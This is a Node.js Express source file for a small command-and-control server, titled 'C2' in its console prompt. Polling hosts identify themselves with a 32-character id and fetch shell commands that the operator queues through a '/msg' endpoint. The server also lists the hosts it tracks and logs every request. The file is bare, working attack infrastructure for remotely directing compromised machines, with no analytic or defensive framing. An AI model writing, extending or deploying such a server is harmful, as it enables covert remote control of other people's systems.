
const express = require('express')
const app = express()
const port = 3000

var hosts = [];

//hosts.find(({id}) => id === "asd")
function FindHost (hostid) {
    return hosts.find(({id}) => id === hostid);
}

function QueryHostid (hostid) {
    //console.log("QueryHostid: "+hostid);
    var response = "echo nope";

    var host = hosts.find(({id}) => id === hostid)
    if (host !== undefined) {

        host.calls = host.calls +1;

        if (host.buffer !== undefined) {
            response= host.buffer;
            delete host.buffer;
        }

    } else {
        hosts.push({id: hostid, calls: 1});
    }

    //console.table(hosts);

    return response;
}

var log = [];

var logger = function (req, res, next) {
    req.requestTime = Date.now()
    log.push("["+req.requestTime.toString()+"]"+req.originalUrl);
    next()
}

app.use(logger);

app.get('/', (req, res) => {

    if (req.query.hostid) {
        var hostid = req.query.hostid;
        if (hostid.length == 32) {
            res.send(''+QueryHostid(hostid));
            //console.log("get / hostid = "+hostid);
        } else {
            res.send('echo nope');
            //console.log("get / with invalid hostid");
        }
    } else {
        res.send('echo nope');
        //console.log("get / without params");
    }
})

app.get('/msg', (req, res) => {
    console.log("get /msg");
    if (req.query.host) {
        console.log(req.query);
        console.log(req.query.buffer);
        //hosts[req.query.host].buffer = req.query.buffer;
        var host = hosts.find(({id}) => id === req.query.host)
        if (host !== undefined) {
            host.buffer = req.query.buffer;
        } else {
            res.send("failed");
        }
        res.send("ok");
        console.table(hosts);
    }
})

app.get('/hosts', (req, res) => {
    res.json(hosts);
})

app.listen(port, () => {
  console.log(`listening at http://localhost:${port}`)
})

var readline = require('readline'),
    rl = readline.createInterface(process.stdin, process.stdout);

rl.setPrompt('C2> ');
rl.prompt();

rl.on('line', function(line) {
    switch(line.trim()) {
        case 'hello':
            console.log('world!');
            break;
        case 'list':
            console.table(hosts);
            break;    
        case 'log':
            console.table(log);
            break;
        default:
            console.log('?`' + line.trim() + '`');
        break;
    }
    rl.prompt();
}).on('close', function() {
    console.log('Have a great day!');
    process.exit(0);
});